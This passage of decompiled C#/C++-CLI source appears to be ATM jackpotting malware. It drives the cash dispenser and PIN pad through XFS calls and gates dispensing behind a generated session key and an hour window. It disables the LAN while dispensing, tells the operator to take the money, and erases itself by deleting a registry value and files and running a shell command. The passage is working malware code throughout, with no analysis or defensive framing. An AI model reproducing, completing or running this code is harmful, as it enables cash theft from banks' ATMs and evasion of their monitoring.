			if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)))
			{
				_003CModule_003E._invalid_parameter_noinfo();
			}
			if (!(ptr2 == ptr))
			{
				int num2 = (int)((nint)System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) - (nint)ptr >> 2);
				int num3 = num2 * 4;
				int* ptr3 = (int*)(num3 + (byte*)ptr2);
				if (num2 > 0)
				{
					_003CModule_003E.memmove_s(ptr2, (uint)num3, ptr, (uint)num3);
				}
				System.Runtime.CompilerServices.Unsafe.As<Struct16, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) = (int)ptr3;
			}
			int num4 = 1;
			_003CModule_003E.smethod_61(&@struct, &num4);
			int num5 = 0;
			_003CModule_003E.smethod_61(&@struct, &num5);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct16 struct2);
			while (true)
			{
				Struct16* dayOfWeek = _003CModule_003E.smethod_57(&struct2, &@struct);
				_003CModule_003E.PIN_PAD_ACTIVE_TIME = isTimeIntervalCorrect(1, _003CModule_003E.TO_HOUR, dayOfWeek);
				_003CModule_003E.Sleep(1000u);
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct16*, void>)(&_003CModule_003E.smethod_58), &@struct);
			throw;
		}
	}

	[return: MarshalAs(UnmanagedType.U1)]
	protected unsafe static bool isTimeIntervalCorrect(int fromHour, int toHour, Struct16* dayOfWeek)
	{
		bool result;
		try
		{
			result = false;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out long num);
			_003CModule_003E._time64(&num);
			tm* ptr = _003CModule_003E._localtime64(&num);
			int num2 = 0;
			if (0 < _003CModule_003E.smethod_59(dayOfWeek))
			{
				tm* ptr2 = (tm*)((byte*)ptr + 8);
				do
				{
					int num3 = *(int*)ptr2;
					if (fromHour > num3 || toHour <= num3 || *_003CModule_003E.smethod_60(dayOfWeek, (uint)num2) != *(int*)((byte*)ptr + 24))
					{
						num2++;
						continue;
					}
					result = true;
					break;
				}
				while ((uint)num2 < _003CModule_003E.smethod_59(dayOfWeek));
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct16*, void>)(&_003CModule_003E.smethod_58), dayOfWeek);
			throw;
		}
		Struct16* ptr3 = (Struct16*)((byte*)dayOfWeek + 4);
		uint num4 = *(uint*)ptr3;
		if (num4 != 0)
		{
			_003CModule_003E.delete((void*)(int)num4);
		}
		*(int*)ptr3 = 0;
		*(int*)((byte*)dayOfWeek + 8) = 0;
		*(int*)((byte*)dayOfWeek + 12) = 0;
		return result;
	}

	[return: MarshalAs(UnmanagedType.U1)]
	protected unsafe bool checkAppForFirstLaunch()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct67 @struct);
		*(sbyte*)(&@struct) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 1), 0, 259);
		_003CModule_003E.wcstombs((sbyte*)(&@struct), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.SYS), 260u);
		int num = (int)_003CModule_003E.ppInt_2;
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY06_0024_0024CBD_0)), (sbyte*)(&@struct)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		sbyte* ptr = (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct69_0);
		sbyte* ptr2 = (sbyte*)(&@struct);
		if (*(bool*)(&@struct))
		{
			do
			{
				ptr2++;
			}
			while (*ptr2 != 0);
		}
		*ptr2 = 92;
		do
		{
			ptr2++;
			ptr++;
		}
		while ((*ptr2 = *ptr) != 0);
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY04_0024_0024CBD_0)), (sbyte*)(&@struct)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		_003CModule_003E.FIRST_START = !is_file_exist((sbyte*)(&@struct));
		if (_003CModule_003E.FIRST_START)
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct56 struct2);
			_003CModule_003E.smethod_125(&struct2, (sbyte*)(&@struct), 2, 64, 1);
			try
			{
				_003CModule_003E.smethod_95((Struct54*)(&struct2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_1));
				_003CModule_003E.smethod_126(&struct2);
			}
			catch
			{
				//try-fault
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct56*, void>)(&_003CModule_003E.smethod_109), &struct2);
				throw;
			}
			_003CModule_003E.smethod_109(&struct2);
		}
		return _003CModule_003E.FIRST_START;
	}

	[return: MarshalAs(UnmanagedType.U1)]
	protected unsafe bool is_file_exist(sbyte* fileName)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct57 @struct);
		_003CModule_003E.smethod_124(&@struct, fileName, 1, 64, 1);
		bool result;
		try
		{
			result = _003CModule_003E.std_002Eios_base_002Egood((ios_base*)((ref *(_003F*)(*(int*)(*(int*)(&@struct) + 4))) + (ref *(_003F*)(&@struct))));
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct57*, void>)(&_003CModule_003E.smethod_110), &@struct);
			throw;
		}
		_003CModule_003E.smethod_110(&@struct);
		return result;
	}

	protected unsafe static void silentDeleteFile(char* filename)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out HKEY__* pHkey___);
		if (_003CModule_003E.RegOpenKeyExW((HKEY__*)(-2147483646), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct33_0), 0u, 983103u, &pHkey___) == 0)
		{
			_003CModule_003E.RegDeleteValueW(pHkey___, (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct34_0));
		}
		_003CModule_003E.RegCloseKey(pHkey___);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct67 @struct);
		*(sbyte*)(&@struct) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 1), 0, 259);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct71 struct2);
		*(short*)(&struct2) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 2), 0, 518);
		_003CModule_003E.wcstombs((sbyte*)(&@struct), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.SYS), 260u);
		sbyte* ptr = (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct69_0);
		sbyte* ptr2 = (sbyte*)(&@struct);
		if (*(bool*)(&@struct))
		{
			do
			{
				ptr2++;
			}
			while (*ptr2 != 0);
		}
		*ptr2 = 92;
		do
		{
			ptr2++;
			ptr++;
		}
		while ((*ptr2 = *ptr) != 0);
		_003CModule_003E.mbstowcs((char*)(&struct2), (sbyte*)(&@struct), 260u);
		_003CModule_003E.SetFileAttributesW((char*)(&struct2), 128u);
		_003CModule_003E.remove((sbyte*)(&@struct));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct71 struct3);
		// IL cpblk instruction
		System.Runtime.CompilerServices.Unsafe.CopyBlock(ref struct3, ref _003CModule_003E.struct35_0, 80);
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct3, 80), 0, 440);
		Struct71* ptr3 = (Struct71*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.SYS);
		Struct71* ptr4 = &struct3;
		if (*(short*)(&struct3) != 0)
		{
			do
			{
				ptr4 = (Struct71*)((byte*)ptr4 + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr4) != 0);
		}
		if (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr4, System.Runtime.CompilerServices.Unsafe.As<Struct71, short>(ref _003CModule_003E.SYS)) != 0)
		{
			do
			{
				ptr4 = (Struct71*)((byte*)ptr4 + 2);
				ptr3 = (Struct71*)((byte*)ptr3 + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr4, System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr3)) != 0);
		}
		char* ptr5 = filename;
		Struct71* ptr6 = &struct3;
		if (*(short*)(&struct3) != 0)
		{
			do
			{
				ptr6 = (Struct71*)((byte*)ptr6 + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr6) != 0);
		}
		if (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr6, System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(filename)) != 0)
		{
			do
			{
				ptr6 = (Struct71*)((byte*)ptr6 + 2);
				ptr5++;
			}
			while (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr6, System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr5)) != 0);
		}
		_003CModule_003E.ShellExecuteW(null, (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY04_0024_0024CB_W_0), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CB_W_1), (char*)(&struct3), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY03_0024_0024CB_W_0), 0);
	}

	protected unsafe static int scenario(int OPERATION)
	{
		switch (OPERATION)
		{
		case 0:
			getCashUnitInfo(_003CModule_003E.cdmHS);
			_003CModule_003E.ShowWindow(_003CModule_003E.winHWND, 5);
			_003CModule_003E.IS_WIN_ACTIVE = true;
			if (!_003CModule_003E.DISPENSE_SESSION_ACTIVE)
			{
				_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_RANDOM_KEY));
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 @struct);
				Struct15* right = _003CModule_003E.GenerateSixDigitNumberVector(&@struct);
				try
				{
					_003CModule_003E.smethod_48((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_RANDOM_KEY), right);
				}
				catch
				{
					//try-fault
					_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), &@struct);
					throw;
				}
				if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) != 0)
				{
					_003CModule_003E.delete((void*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)));
				}
				System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) = 0;
				System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) = 0;
				System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 12)) = 0;
				PrintCode();
				Color yellow5 = Color.Yellow;
				PrintInfo((Control)(object)Globals.infoLabel[1], "ENTER SESSION KEY TO PROCEED!", yellow5);
			}
			else
			{
				Color white7 = Color.White;
				PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION PERMITTED.", white7);
				Color yellow6 = Color.Yellow;
				PrintInfo((Control)(object)Globals.infoLabel[1], "TO START DISPENSE OPERATION - \nENTER CASSETTE NUMBER AND PRESS ENTER.", yellow6);
			}
			break;
		case 2:
		{
			Color white5 = Color.White;
			PrintInfo((Control)(object)Globals.infoLabel[0], "DISABLING LOCAL AREA NETWORK...\nPLEASE WAIT...", white5);
			Color black4 = Color.Black;
			PrintInfo((Control)(object)Globals.infoLabel[1], "", black4);
			_003CModule_003E.DISPENSE_SESSION_ACTIVE = true;
			_003CModule_003E.CoInitialize(null);
			_003CModule_003E.EnableConnection((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct12_0), bEnable: false);
			_003CModule_003E.CoUninitialize();
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct30_1));
			Color white6 = Color.White;
			PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION PERMITTED.", white6);
			Color yellow4 = Color.Yellow;
			PrintInfo((Control)(object)Globals.infoLabel[1], "TO START DISPENSE OPERATION - \nENTER CASSETTE NUMBER AND PRESS ENTER.", yellow4);
			break;
		}
		case 3:
		{
			_003CModule_003E.TO_HOUR = 10;
			Color yellowGreen = Color.YellowGreen;
			PrintInfo((Control)(object)Globals.infoLabel[2], "TIME WAS EXTENED. +++", yellowGreen);
			_003CModule_003E.Sleep(2000u);
			Color black5 = Color.Black;
			PrintInfo((Control)(object)Globals.infoLabel[2], "", black5);
			break;
		}
		default:
			if (_003CModule_003E.DISPENSE_SESSION_ACTIVE && _003CModule_003E.IS_WIN_ACTIVE)
			{
				_003CModule_003E.CoInitialize(null);
				_003CModule_003E.EnableConnection((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct12_0), bEnable: false);
				_003CModule_003E.CoUninitialize();
				if (_003CModule_003E.smethod_49((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CHOISE)) != 0)
				{
					int decimalNumberFromPINFKDigit = getDecimalNumberFromPINFKDigit(*_003CModule_003E.smethod_50((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CHOISE), 0u));
					if (decimalNumberFromPINFKDigit >= 1 && decimalNumberFromPINFKDigit <= _003CModule_003E.CU_TOTAL_COUNT && _003CModule_003E.smethod_49((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CHOISE)) == 1)
					{
						Color white = Color.White;
						PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION IN PROGRESS...PLEASE WAIT...", white);
						executeDispense(_003CModule_003E.cdmHS, decimalNumberFromPINFKDigit);
						getCashUnitInfo(_003CModule_003E.cdmHS);
						Color white2 = Color.White;
						PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION FINISHED.", white2);
						Color yellow2 = Color.Yellow;
						PrintInfo((Control)(object)Globals.infoLabel[1], "TAKE THE MONEY NOW!", yellow2);
						_003CModule_003E.Sleep(3000u);
						Color white3 = Color.White;
						PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION PERMITTED.", white3);
						Color yellow3 = Color.Yellow;
						PrintInfo((Control)(object)Globals.infoLabel[1], "TO START DISPENSE OPERATION - \nENTER CASSETTE NUMBER AND PRESS ENTER.", yellow3);
						break;
					}
				}
				_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_3));
				Color white4 = Color.White;
				PrintInfo((Control)(object)Globals.infoLabel[0], "CASH OPERATION PERMITTED.", white4);
				Color orange = Color.Orange;
				PrintInfo((Control)(object)Globals.infoLabel[1], "INVALID CASSETTE NUMBER. TRY AGAIN.\nTO START DISPENSE OPERATION - \nENTER CASSETTE NUMBER AND PRESS ENTER.", orange);
			}
			else
			{
				Color orange2 = Color.Orange;
				PrintInfo((Control)(object)Globals.infoLabel[1], "DISPENSE OPERATION DENIED. ENTER SESSION KEY.", orange2);
				_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct36_0));
			}
			break;
		case 9:
		{
			_003CModule_003E.CoInitialize(null);
			_003CModule_003E.EnableConnection((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct12_0), bEnable: true);
			_003CModule_003E.CoUninitialize();
			_003CModule_003E.WFSClose(_003CModule_003E.pinpadHS);
			_003CModule_003E.WFSClose(_003CModule_003E.cdmHS);
			_003CModule_003E.WFSCleanUp();
			silentDeleteFile((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct34_1));
			Color yellow = Color.Yellow;
			PrintInfo((Control)(object)Globals.infoLabel[0], "DELETING APPLICATION...", yellow);
			Color black = Color.Black;
			PrintInfo((Control)(object)Globals.infoLabel[1], "", black);
			_003CModule_003E.Sleep(2000u);
			_003CModule_003E.exit(0);
			goto case 1;
		}
		case 1:
		{
			_003CModule_003E.CoInitialize(null);
			_003CModule_003E.EnableConnection((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct12_0), bEnable: true);
			_003CModule_003E.CoUninitialize();
			Color black2 = Color.Black;
			PrintInfo((Control)(object)Globals.infoLabel[0], "", black2);
			Color black3 = Color.Black;
			PrintInfo((Control)(object)Globals.infoLabel[1], "", black3);
			_003CModule_003E.ShowWindow(_003CModule_003E.winHWND, 0);
			_003CModule_003E.IS_WIN_ACTIVE = false;
			break;
		}
		}
		return -1;
	}

	protected unsafe static uint MainLoop(void* lParam)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 @struct);
		System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) = 0;
		System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) = 0;
		System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 12)) = 0;
		try
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct2);
			System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 4)) = 0;
			System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8)) = 0;
			System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 12)) = 0;
			try
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct15 struct7);
				while (true)
				{
					uint* ptr = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					uint* ptr2 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					if (!(ptr2 == ptr))
					{
						int num = (int)((nint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) - (nint)ptr >> 2);
						int num2 = num * 4;
						uint* ptr3 = (uint*)(num2 + (byte*)ptr2);
						if (num > 0)
						{
							_003CModule_003E.memmove_s(ptr2, (uint)num2, ptr, (uint)num2);
						}
						System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 8)) = (int)ptr3;
					}
					uint* ptr4 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					uint* ptr5 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 4));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					if (!(ptr5 == ptr4))
					{
						int num3 = (int)((nint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8)) - (nint)ptr4 >> 2);
						int num4 = num3 * 4;
						uint* ptr6 = (uint*)(num4 + (byte*)ptr5);
						if (num3 > 0)
						{
							_003CModule_003E.memmove_s(ptr5, (uint)num4, ptr4, (uint)num4);
						}
						System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 8)) = (int)ptr6;
					}
					uint* ptr7 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					uint* ptr8 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					if (!(ptr8 == ptr7))
					{
						int num5 = (int)((nint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) - (nint)ptr7 >> 2);
						int num6 = num5 * 4;
						uint* ptr9 = (uint*)(num6 + (byte*)ptr8);
						if (num5 > 0)
						{
							_003CModule_003E.memmove_s(ptr8, (uint)num6, ptr7, (uint)num6);
						}
						System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_SESSION_KEY, 8)) = (int)ptr9;
					}
					uint* ptr10 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 8));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					uint* ptr11 = (uint*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 4));
					if ((uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 4)) > (uint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 8)))
					{
						_003CModule_003E._invalid_parameter_noinfo();
					}
					if (!(ptr11 == ptr10))
					{
						int num7 = (int)((nint)System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 8)) - (nint)ptr10 >> 2);
						int num8 = num7 * 4;
						uint* ptr12 = (uint*)(num8 + (byte*)ptr11);
						if (num7 > 0)
						{
							_003CModule_003E.memmove_s(ptr11, (uint)num8, ptr10, (uint)num8);
						}
						System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CHOISE, 8)) = (int)ptr12;
					}
					Struct15* @in = _003CModule_003E.smethod_46(&struct3, (Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_RANDOM_KEY));
					Struct15* generatedKey = _003CModule_003E.RegenerateSixDigitNumberVector(&struct4, @in);
					Struct15* masterKeyToPinFK = GetMasterKeyToPinFK(&struct5, generatedKey);
					try
					{
						_003CModule_003E.smethod_48((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.MKEY_SESSION_KEY), masterKeyToPinFK);
					}
					catch
					{
						//try-fault
						_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), &struct5);
						throw;
					}
					if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct5, 4)) != 0)
					{
						_003CModule_003E.delete((void*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct5, 4)));
					}
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct5, 4)) = 0;
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct5, 8)) = 0;
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct5, 12)) = 0;
					_003CModule_003E.ISBLOCKING = 1;
					Struct15* right = waitForMasterKey(&struct6, _003CModule_003E.keyFuncMask, 1024u);
					try
					{
